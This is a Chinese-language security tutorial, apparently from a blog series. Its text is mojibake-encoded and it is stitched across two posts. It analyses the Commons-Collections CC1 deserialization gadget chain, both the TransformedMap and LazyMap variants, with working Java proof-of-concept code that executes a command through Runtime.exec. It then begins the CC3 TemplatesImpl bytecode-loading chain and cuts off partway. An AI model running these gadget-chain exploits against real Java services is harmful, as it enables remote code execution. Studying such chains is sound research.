&lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; ç„¶åæ‰“å¼€ IDEA æ–‡ä»¶-&gt;é¡¹ç›®ç»“æ„-&gt; SDK -&gt; æºè·¯å¾„è®¾ç½® å¡«ä¸Šåˆšæ‰è®¾ç½®çš„çš„srcç›®å½• åœ¨srcç›®å½•ä¸‹å³é”®åˆ›å»ºjavaç›®å½• resourceç›®å½• è¿™é‡ŒIDEAåœ¨srcåˆ›å»ºç›®å½•æ—¶æä¾›äº†è¿™ä¸¤ä¸ªé€‰é¡¹ ç›´æ¥åˆ›å»ºå³å¯ &lt;2&gt; é“¾å­åˆ†æ 123456789101112131415161718192021/* Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() Requires: commons-collections */ (1) æ‰¾Sinké“¾å­ä¸»è¦ç”¨åˆ°çš„æ˜¯è¿™ä¸ª transformeræ¥å£ã€‚è¿™ä¸ªæ¥å£å°±æ¥å—ä¸€ä¸ªObjectç±»ç„¶ååˆ©ç”¨æ–¹æ³•transform InvokerTransformer ç›¸å½“äºå¸®æˆ‘ä»¬å®ç°äº†ä¸€ä¸ªåå°„è°ƒç”¨ï¼Œå‚æ•°éƒ½å¯æ§ å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ InvokerTransformerç±»çš„ transform æ–¹æ³•æ¥invoke Runtimeç±»getRuntimeå¯¹è±¡çš„execå®ç° rce ä»£ç å¦‚ä¸‹ï¼š 123456789public class CC1Test { public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException { Runtime r = Runtime.getRuntime(); new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}).transform(r); }} æ‰€ä»¥æˆ‘ä»¬ä¹Ÿå°±æ‰¾åˆ°äº†CC1é“¾çš„ Sinkç‚¹ â€” InvokerTransformer::transform() (2) æ‰¾gadgetåœ¨çŸ¥é“äº† InvokerTransformer::transform()å¯ä»¥rceä¹‹åï¼Œæˆ‘ä»¬å°±æ‰¾ä¸€ä¸‹ å“ªäº›ç±»å¯ä»¥è°ƒç”¨ InvokerTransformer.transform()æ–¹æ³• æŸ¥æ‰¾ä¸€ä¸‹ transform() çš„ç”¨æ³•ï¼š å‘ç°TransformedMapç±»çš„ checkSetValue() é‡Œä½¿ç”¨äº† valueTransformerè°ƒç”¨transform() è€Œè¿™ä¸ª valueTransformerå‚æ•°æ˜¯å¦å¯æ§å‘¢ï¼Ÿ æ˜¯ä»€ä¹ˆç±»å‹å‘¢ï¼Ÿ æˆ‘ä»¬è·Ÿè¿›æŸ¥çœ‹ä¸€ä¸‹ TransformedMapç±» TransformedMapç±»123456789101112131415//æ„é€ æ–¹æ³• ä½†æ˜¯æ˜¯protectedç±»å‹çš„ protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) { super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer; }//å¯ä»¥åˆ©ç”¨decorateæ–¹æ³•æ¥ç”Ÿæˆ TransformedMapå®ä¾‹ public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer); } protected Object checkSetValue(Object value) { return valueTransformer.transform(value); } è¿™é‡Œå¯ä»¥çœ‹åˆ° valueTransformeræ˜¯Transformerç±»å‹ï¼Œè€Œä¸”æ„é€ å‡½æ•°é‡Œå¯ä»¥ç›´æ¥èµ‹å€¼ å¯æ§ã€‚ å¦‚æœæˆ‘ä»¬å¯ä»¥è°ƒç”¨ TransformedMapçš„checkSetValueæ–¹æ³•ï¼Œé‚£æˆ‘ä»¬ç»™ valueTransformer èµ‹å€¼ æ„é€ çš„InvokerTransformerå®ä¾‹ å°±å¯ä»¥é€šè¿‡ valueTransformer.transform(value); å®ç° InvokerTransformer.transform(value); ä»è€Œ rce ç»§ç»­æ‰¾å…¥å£ç‚¹ï¼Œå»è§¦å‘checkSetValue è·Ÿè¿›æŸ¥çœ‹ å‘ç°åªæœ‰ çˆ¶ç±» AbstractInputCheckedMapDecoratoræŠ½è±¡ç±»é‡Œçš„ MapEntry çš„setValue() è°ƒç”¨äº†checkSetValue() å› æ­¤æˆ‘ä»¬å¯ä»¥å†æ¬¡æ„é€ ä¸€ä¸ªé“¾å­ å®ç°rceä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.IOException;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;public class CC1Test { public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException { Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;key&quot;,&quot;value&quot;); Map&lt;Object,Object&gt; transfromedMap = TransformedMap.decorate(map, null, invokerTransformer); for(Map.Entry entry:transfromedMap.entrySet()){ entry.setValue(r); } }} (3) æ‰¾ååºåˆ—åŒ–å…¥å£ç‚¹ç»§ç»­æ‰¾é“¾å­ï¼Œæœ€ç»ˆæˆ‘ä»¬åº”è¯¥æ‰¾åˆ°çš„æ˜¯ä¸€ä¸ª ç»§æ‰¿äº†Serializeæ¥å£çš„ï¼Œå®ç°äº†readObject()æ–¹æ³•ä¸”æ–¹æ³•é‡Œè°ƒç”¨äº†é“¾å­é‡Œçš„æŸä¸ªå‡½æ•°ã€‚ å¦‚æœæ‰¾ä¸åˆ°åºåˆ—åŒ–å…¥å£ç‚¹çš„è¯ï¼Œå°±éœ€è¦å†çœ‹çœ‹å“ªä¸ªç±»é‡Œé¢è°ƒç”¨äº†è§¦å‘setValue()çš„æ–¹æ³•ï¼Œå®ç°entry.setValue()çš„æ•ˆæœï¼Œéœ€è¦å¤šèµ°ä¸€å±‚ ä½†æ˜¯CC1é‡Œåˆšå¥½ï¼ŒAnnotationInvocationHandlerç±»readObjecté‡Œé¢çš„readObjectæ–¹æ³•è°ƒç”¨äº†setValue ä¸”å¯è¢«åˆ©ç”¨ å¾ªç¯éå†äº†mapï¼Œä¸”å¯¹ membervalueè°ƒç”¨äº†setValueã€‚å®Œç¾ç¬¦åˆäº†æˆ‘ä»¬åˆšæ‰æµ‹è¯•ä»£ç çš„æ ¼å¼ æˆ‘ä»¬è·Ÿè¿›çœ‹ä¸€ä¸‹ AnnotationInvocationHandlerç±» æœ‰ä»€ä¹ˆæ˜¯å¯ä»¥æ§åˆ¶çš„ Annotationå°±æ˜¯Javaé‡Œé¢æ³¨è§£çš„æ„æ€ï¼Œæ‰€ä»¥è¿™ä¸ªç±»æ˜¯å’ŒJavaæ³¨è§£æœ‰å…³çš„ä¸€ä¸ªç±» è€Œä¸”invocationHandleråŠ¨æ€ä»£ç†ä¸­çš„ä¸€ä¸ªè°ƒç”¨å¤„ç†å™¨ç±» æ³¨æ„è¿™ä¸ªç±»ä¸æ˜¯publicç±»å‹ï¼Œä¸èƒ½ç›´æ¥è·å–ï¼Œå› æ­¤éœ€è¦åå°„è·å–Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); æ ¹æ®è¿™äº›ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä»£ç æ”¹ä¸ºï¼š 123456789101112131415161718192021222324public class CC1Test { public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, ClassNotFoundException { Runtime r = Runtime.getRuntime(); //new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}).transform(r); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;key&quot;,&quot;value&quot;); Map&lt;Object,Object&gt; transfromedMap = TransformedMap.decorate(map, null, invokerTransformer);// for(Map.Entry entry:transfromedMap.entrySet()){// entry.setValue(r); è¿™é‡Œ setValueåº”è¯¥ä¼  Runtime.getRuntime()å¯¹è±¡çš„// } Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationInvocationHandlerConstructor.setAccessible(true); Object o = annotationInvocationHandlerConstructor.newInstance(Override.class,transfromedMap); } ä½†æ˜¯å‘¢ï¼Œè¿™é‡Œè¿˜å­˜åœ¨ä¸¤ä¸ªé—®é¢˜ annotationInvocationHandlerç±»readObjecté‡Œ setValue() é‡Œå‚æ•°å¥½åƒæ˜¯æ§åˆ¶ä¸äº†çš„123456789if (memberType != null) { // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); } å‰é¢æµ‹è¯•é‡Œçš„ï¼ŒRuntimeå¯¹è±¡æ˜¯è‡ªå·±ç”Ÿæˆçš„ï¼Œä½†æ˜¯å®ƒæ²¡æœ‰ç»§æ‰¿Serializableæ¥å£ï¼Œæ˜¯ä¸èƒ½è¢«åºåˆ—åŒ–çš„ Runtimeå¯¹è±¡ä¸èƒ½åºåˆ—åŒ–é—®é¢˜â€“è§£å†³Runtime()æ²¡æœ‰ç»§æ‰¿Serializableæ¥å£ï¼Œä¸èƒ½åºåˆ—åŒ–ï¼Œé‚£æˆ‘ä»¬æƒ³ä¸€æƒ³ ä»€ä¹ˆæ˜¯å¯ä»¥è¢«åºåˆ—åŒ–çš„å‘¢ï¼Ÿ å®ƒçš„ Class(ç±»çš„åŸå‹)æ˜¯å¯ä»¥åºåˆ—åŒ–çš„ï¼Œå¯ä»¥é€šè¿‡å®ƒçš„Class å¼„å‡ºæ¥ä¸€ä¸ªå®ƒ è¿‡ç¨‹ï¼šè·å–Runtime Class -&gt; è·å– getRuntime()æ–¹æ³• -&gt; è·å– å®ä¾‹ -&gt; è·å– execæ–¹æ³• éœ€è¦ä¸‰æ¬¡åå°„ ä»£ç å¦‚ä¸‹ï¼š 12345Class c = Runtime.class;Method getRuntimeMethod = c.getMethod(&quot;getRuntime&quot;);Runtime r = (Runtime) getRuntimeMethod.invoke(null, null);Method execMethod = c.getMethod(&quot;exec&quot;, String.class);execMethod.invoke(r,&quot;calc&quot;); è½¬åŒ–ä¸ºç”¨é“¾å­çš„Sinkç‚¹ InvokerTransformerçš„transformæ¥åå°„ä»£ç å¦‚ä¸‹ï¼š 1234Object getRuntimeMethod = new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}).transform(Runtime.class);Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}).transform(r); å¯ä»¥çœ‹åˆ° ç”¨InvokerTransformerçš„transformæ¥åå°„ éƒ½æ˜¯åä¸€ä¸ªè°ƒå‰ä¸€ä¸ªè¿™ç§çš„ æœ‰ä¸€ä¸ª ChainedTransformer ç±»æ­£å¥½å¯ä»¥å¹²è¿™ä¸ªï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªç±» æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç±»ï¼ŒæŠŠä»–ä»¬å†™åœ¨ä¸€èµ· å†™æˆä¸€ä¸ªTransformer[] æ•°ç»„å³å¯ 1234567Transformer[] transformers = new Transformer[]{ new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;})};ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class); å› æ­¤ï¼ŒåŸæœ¬çš„é“¾å­ä»£ç ï¼Œå¯ä»¥è½¬åŒ–ä¸ºï¼š 123456789101112131415161718192021222324252627282930313233public class CC1Test { public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, ClassNotFoundException { Transformer[] transformers = new Transformer[]{ new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;key&quot;,&quot;value&quot;); Map&lt;Object,Object&gt; transfromedMap = TransformedMap.decorate(map, null, chainedTransformer); Class&lt;?&gt; c1 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationInvocationHandlerConstructor = c1.getDeclaredConstructor(Class.class, Map.class); annotationInvocationHandlerConstructor.setAccessible(true); Object o = annotationInvocationHandlerConstructor.newInstance(Override.class,transfromedMap); serialize(o); unserialize(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); return ois.readObject(); }} ä½†æ˜¯ æˆ‘ä»¬æ‰§è¡Œä¸€ä¸‹ ç¼ºå¹¶ä¸èƒ½å¼¹å‡ºè®¡ç®—å™¨ å› ä¸ºè¿˜æœ‰ä¸€ä¸ªé—®é¢˜æ²¡æœ‰è§£å†³ annotationInvocationHandlerç±»readObjecté‡Œ setValue() é‡Œå‚æ•°æ§åˆ¶ â€“è§£å†³æˆ‘ä»¬è°ƒè¯•è¿›å»çœ‹ä¸€ä¸‹ åœ¨ååºåˆ—åŒ– readObjectæ‰§è¡Œæ—¶ï¼Œ ä¼šç»™name = memberValue.getKey(); è€ŒmemberValueå³ä¸ºæˆ‘ä»¬ä¼ å…¥çš„Mapï¼Œæ‰€ä»¥å°±æ˜¯è·å¾—å®ƒçš„keyï¼Œè¿™é‡Œæˆ‘ä»¬èµ‹çš„å€¼ä¸ºâ€keyâ€ ç„¶åä¼š æ‰§è¡ŒmemberType = memberTypes.get(name); ä»€ä¹ˆæ˜¯memberTypeså‘¢ï¼Ÿ å®ƒä¼šè·å–memberTypeé‡Œçš„åä¸º name çš„æˆå‘˜æ–¹æ³•ç”±äºæ³¨è§£ Override é‡Œé¢å¹¶æ²¡æœ‰keyè¿™ä¸ªå‚æ•° å› æ­¤ä¼šå¯¼è‡´ memberTypeä¸ºnull è¿›ä¸å»ifè¯­å¥é‡Œäº† é‚£æˆ‘ä»¬å¿…é¡»ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„æœ‰æˆå‘˜æ–¹æ³•çš„Classï¼ŒåŒæ—¶æˆ‘ä»¬çš„Mapé‡Œçš„keyå€¼è¿˜è¦æ”¹ä¸ºè¿™ä¸ªæˆå‘˜æ–¹æ³•åå­—ã€‚è€Œ Targeté‡Œæœ‰ valueæ–¹æ³•ã€‚ é‚£æˆ‘ä»¬æ›´æ”¹æ„é€ å™¨é‡Œ Override.class ä¸º Targe.class åŒæ—¶æ›´æ”¹Map çš„keyçš„å€¼ä¸ºå­—ç¬¦ä¸²â€valueâ€ è¿™æ ·ä¸å°±èƒ½æ‰¾åˆ°äº†å—ï¼Ÿ æˆåŠŸè¿›å…¥ifè¯­å¥é‡Œ ç„¶ååº•ä¸‹é‚£ä¸ªif åˆ¤æ–­ if (!(memberType.isInstance(value) ||value instanceof ExceptionProxy))å®é™…ä¸Šæ˜¯åˆ¤æ–­å®ƒä¿©èƒ½ä¸èƒ½å¼ºè½¬ï¼Œè‚¯å®šå¼ºè½¬ä¸äº†çš„ã€‚èƒ½è¿›æ¥ æœ€åå°±åˆ°äº†è¿™ä¸ª setValue()çš„åœ°æ–¹ï¼Œå¦‚æœè¿™é‡Œèƒ½æ§åˆ¶ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº† ä½†æ˜¯å‚æ•°å¥½åƒ å®ƒæ˜¯newçš„ä¸€ä¸ªä»£ç†ç±»ï¼Œå¹¶ä¸èƒ½è¢«æ§åˆ¶ æ€ä¹ˆåŠå‘¢ï¼Ÿ ç»§ç»­è·Ÿè¿›ï¼Œçœ‹ä¸€ä¸‹ï¼Œåˆ°äº†è¿™é‡Œï¼Œå°±æ˜¯æœ€åçš„è¿™ä¸ªç‚¹äº† è¿™é‡Œè¿™ä¸ªvalueTransformer.transform(value); å®é™…ä¸Šæˆ‘ä»¬éœ€è¦æŠŠvalue æ”¹æˆè¿™ä¸ªRuntime.class æ‰å¯ä»¥è€Œè¿™é‡Œçš„valueæ˜¯ è¿™ä¸ª AnnotationTypeMismatchExceptionProxy 12//valueTransformer.transform(value);//chainedTransformer.transform(Runtime.class); è¿™æ ·çš„è¯ï¼Œå°±ä¸å¾—ä¸æåˆ°è¿™ä¸ª ConstantTransformerç±»äº† ConstantTransformerç±» å®ƒé‡å†™äº†transformæ–¹æ³•ã€‚å®ƒçš„ç‰¹ç‚¹å°±æ˜¯ä¸ç®¡å®ƒæ¥å—ä»€ä¹ˆè¾“å…¥inputï¼Œéƒ½è¿”å›ç‰¹å®šçš„é‚£ä¸ªå€¼iConstant è¿ç”¨åˆ°è¿™è¾¹çš„è¯ï¼Œé‚£å°±ååˆ†å¥½ç”¨äº†ã€‚ å³ä½¿æœ€åçš„é‚£ä¸ªè¾“å…¥å¹¶ä¸ç†æƒ³ï¼Œåªè¦æœ€åè°ƒç”¨äº†è¿™ä¸ªç±»çš„transform()æ–¹æ³•ï¼Œç„¶åå°±å¯ä»¥ä»è¿™é‡Œå…¥æ‰‹ï¼Œæ— è§†inputï¼Œæ”¹æˆç‰¹å®šçš„é‚£ä¸ªå€¼iConstantã€‚ è¿™é‡Œæˆ‘ä»¬æŠŠ new ConstantTransformer(Runtime.class) å†™å…¥åˆ° transformersæ•°ç»„é‡Œï¼Œ å°±æ˜¯è¯´åœ¨æœ€åvalueTransformer.transform(value); å³ chainedTransformer.transform(ä»£ç†object);å¾ªç¯è°ƒç”¨çš„æ—¶å€™ï¼Œé¦–å…ˆè°ƒç”¨äº† ConstantTransformerçš„transformæ–¹æ³•ï¼ŒæŠŠè¾“å…¥çš„è¿™ä¸ªvalueæ— è§†ï¼Œè€Œè¿”å› Runtime.classè¾¾åˆ°æ§åˆ¶çš„æ•ˆæœã€‚ æœ€å å®ç°äº† è·å–Runtime Class -&gt; è·å– getRuntime()æ–¹æ³• -&gt; è·å– å®ä¾‹ -&gt; è·å– execæ–¹æ³• æœ€åï¼ŒæˆåŠŸæ‰§è¡Œcalc &lt;3&gt; LazyMapé“¾åˆ†æå’Œä¹‹å‰çš„å·®ä¸å¤šï¼Œå®é™…ä¸ŠåŒºåˆ«å°±æ˜¯ è¿™ä¸ª.get æ˜¯åœ¨LazyMap.get() 12345678910111213141516171819/* Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec()*/ æ‰€ä»¥åŸæœ¬çš„ä»£ç åº”è¯¥æ”¹ä¸ºï¼š 1234567891011121314151617181920212223242526272829303132333435public class CC1_lazy { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer); Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationInvocationhdlConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Override.class, lazyMap); Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h); Object o = annotationInvocationhdlConstructor.newInstance(Override.class, mapProxy); serialize(o); unserialize(&quot;sercc1.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;sercc1.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); return ois.readObject(); }}","link":"/2023/06/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collection%E7%AF%8701-CC1%E9%93%BE/"},{"title":"Javaååºåˆ—åŒ–Commons-Collectionç¯‡03-CC3é“¾","text":"&lt;1&gt; ç¯å¢ƒåˆ†æå‰ä¸¤æ¡ CC1å’ŒCC6åˆ©ç”¨invokeåå°„è°ƒç”¨Runtime().getRuntime().exec()æ‰§è¡Œå‘½ä»¤ å¾ˆå¤šæ—¶å€™æœåŠ¡å™¨çš„ä»£ç å½“ä¸­çš„é»‘åå•ä¼šé€‰æ‹©ç¦ç”¨ Runtime CC3æ˜¯åˆ©ç”¨ç±»åŠ è½½æœºåˆ¶ï¼ŒåŠ¨æ€åŠ è½½æ¶æ„ç±»æ¥å®ç°è‡ªåŠ¨æ‰§è¡Œæ¶æ„ç±»ä»£ç çš„ è¿™é‡Œæµ‹è¯•ç¯å¢ƒä¸ºï¼šjdkï¼šjdk8u65CCï¼šCommons-Collections 3.2.1 &lt;2&gt; é“¾å­åˆ†æCC3çš„sinkç‚¹åœ¨äº defineClass()ä½†æ˜¯åªåŠ è½½æ¶æ„ç±» ä¸åˆå§‹åŒ–çš„è¯ æ˜¯ä¸ä¼šæ‰§è¡Œä»£ç çš„ï¼Œè¿˜éœ€è¦ä¸€ä¸ª newInstance åˆå§‹åŒ–çš„æ“ä½œã€‚ defineClass() å¾€å¾€éƒ½æ˜¯ protectedç±»å‹çš„ åªèƒ½é€šè¿‡åå°„å»è°ƒç”¨ ä½†æ˜¯ä¸‹é¢æˆ‘ä»¬ä¼šä»‹ç»åˆ°ä¸€ä¸ªç±» å®ƒå°±æ˜¯CC3 rceçš„åˆ©ç”¨ç‚¹ (1)TemplatesImpl è§£æåœ¨æˆ‘ä»¬å‰é¢ ç±»åŠ è½½æœºåˆ¶è¿™ç¯‡æ–‡ç«  https://www.cnblogs.com/1vxyz/p/17245206.html ä¸­æåˆ°äº†ä¸€ç§åˆ©ç”¨TemplatesImpl åŠ è½½å­—èŠ‚ç çš„æ–¹æ³• å®ƒçš„é“¾å­ä¸ºï¼š 1234567/*TemplatesImpl#getOutputProperties() TemplatesImpl#newTransformer() TemplatesImpl#getTransletInstance() TemplatesImpl#defineTransletClasses() TransletClassLoader#defineClass()*/ TemplatesImplç±» è¿™ä¸ªç±»å­˜åœ¨ä¸€ä¸ªå†…éƒ¨ç±» TransletClassLoader ç»§æ‰¿äº† ClassLoaderå¹¶ä¸”é‡å†™äº† defineClass æ–¹æ³• é‡å†™çš„defineClassæ–¹æ³•å¯ä»¥è¢«å¤–éƒ¨ç±»è°ƒç”¨ æˆ‘ä»¬å†çœ‹çœ‹TemplatesImplé‡Œå“ªé‡Œè°ƒç”¨äº†defineClass defineTransletClasses() è°ƒç”¨äº†ï¼Œå¯æƒœä¹Ÿæ˜¯ä¸€ä¸ª private ç§æœ‰å±æ€§ å†æ‰¾ æˆ‘ä»¬æ‰¾åˆ°äº†è¿™ä¸ª getTransletInstance() è¿™ä¸ª ä»–ä¸ä»…å¯¹__classä½œäº†åˆ¤æ–­ï¼Œä¸ºç©ºçš„è¯èµ‹å€¼ï¼Œèµ‹å®Œå€¼åè¿˜è°ƒç”¨äº† newInstance() é‚£æˆ‘ä»¬å°±é‡ç‚¹å…³æ³¨è¿™ä¸ªå‡½æ•°äº†ï¼Œèƒ½ç”¨çš„è¯ï¼Œå°±ç›¸å½“äºæˆ‘ä»¬å°±å¯ä»¥åŠ¨æ€æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç äº† è¿™ä¸ªä¹Ÿæ˜¯privateçš„ï¼Œæˆ‘ä»¬å†å¾€ä¸Šæ‰¾ å°±æ‰¾åˆ°äº†è¿™ä¸ª newTransformer() è¿™ä¸ªæ˜¯publicçš„ è¿™å°±æ˜¯è¿™ä¸ª TemplatesImplçš„é“¾å­ (2) TemplatesImpl åˆ©ç”¨é€»è¾‘åˆ†æé“¾å­å‡½æ•°ä¹‹é—´çš„å…³ç³»æ‰¾åˆ°äº†ä¹‹åï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€çœ‹è¯¦ç»†è°ƒç”¨è¿‡ç¨‹ çœ‹çœ‹æ€ä¹ˆåˆ©ç”¨ è¿™é‡Œ newTransformer() è¿™é‡Œ ä¼šç›´æ¥è°ƒç”¨ getTransletInstanceä¸éœ€è¦æ»¡è¶³ä¸€äº›æ¡ä»¶ æˆ‘ä»¬è·Ÿè¿› è¿™é‡Œæˆ‘ä»¬ éœ€è¦èµ‹å€¼ _name ä¸èƒ½èµ‹å€¼ _class å› ä¸ºæˆ‘ä»¬å°±æ˜¯æƒ³è°ƒç”¨defineTransletClassesç»§ç»­è·Ÿè¿› defineTransletClasses _bytecodeséœ€è¦èµ‹å€¼ _tfactory éœ€è¦èµ‹å€¼ _bytecodes ä¸èµ‹å€¼å°±æŠ›å¼‚å¸¸äº†ï¼Œ_tfactoryéœ€è¦è°ƒæ–¹æ³•çš„ ä¹Ÿéœ€è¦èµ‹å€¼ ç¼–å†™expæˆ‘ä»¬éœ€è¦é€šè¿‡åå°„ ç»™ TemplatesImpl çš„ _nameã€_bytecodesã€_tfactory èµ‹å€¼ _name çš„å€¼ï¼Œè¿™é‡Œéœ€è¦çš„æ˜¯ Stringï¼Œæ‰€ä»¥æˆ‘ä»¬ç®€å•èµ‹ä¸ª String _bytecodes çš„å€¼ï¼Œè¿™é‡Œéœ€è¦çš„æ˜¯byte[][] ä½†æ˜¯ _bytecodes ä½œä¸ºä¼ é€’è¿› defineClass æ–¹æ³•çš„å€¼æ˜¯ä¸€ä¸ªä¸€ç»´æ•°ç»„ã€‚è€Œè¿™ä¸ªä¸€ç»´æ•°ç»„é‡Œé¢æˆ‘ä»¬éœ€è¦å­˜æ”¾æ¶æ„çš„å­—èŠ‚ç  å¯ä»¥è¿™æ ·èµ‹å€¼ 12byte[] evil = Files.readAllBytes(Paths.get(&quot;evil.class&quot;)); byte[][] codes = {evil}; _tfactory è¿™é‡Œæ¯”è¾ƒéš¾ private transient TransformerFactoryImpl _tfactory = null;æ˜¯transientç±»å‹çš„ æ— æ³•å†™è¿›åºåˆ—åŒ–é‡Œç›´æ¥ä¿®æ”¹æ˜¯ä¸è¡Œçš„ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œçš„åˆ©ç”¨è¦æ±‚æ¯”è¾ƒä½ï¼Œåªè¦è®© _tfactory ä¸ä¸º null å³å¯readObjecté‡Œæœ‰ç»™å®ƒçš„èµ‹å€¼è¯­å¥ _tfactory = new TransformerFactoryImpl();æ‰€ä»¥ç›´æ¥åœ¨åå°„ä¸­å°†å…¶èµ‹å€¼ä¸º TransformerFactortImpl å³å¯ åå°„èµ‹å€¼æ“ä½œå®é™…ä¸Šæ˜¯é‡å¤çš„ è¿™é‡Œæˆ‘ä»¬å†™ä¸€ä¸ªæ–¹æ³•æ¥å®ç° 12345678910111213141516171819202122232425262728293031import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javax.xml.transform.TransformerConfigurationException;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class CC3Test { public static void main(String[] args) throws TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,&quot;_name&quot;,&quot;1vxyz&quot;); byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\\\Java-IDEA\\\\java_workspace\\\\CC\\\\target\\\\classes\\\\org\\\\example\\\\evil.class&quot;)); byte[][] codes = {code}; setFieldValue(templates,&quot;_bytecodes&quot;,codes); 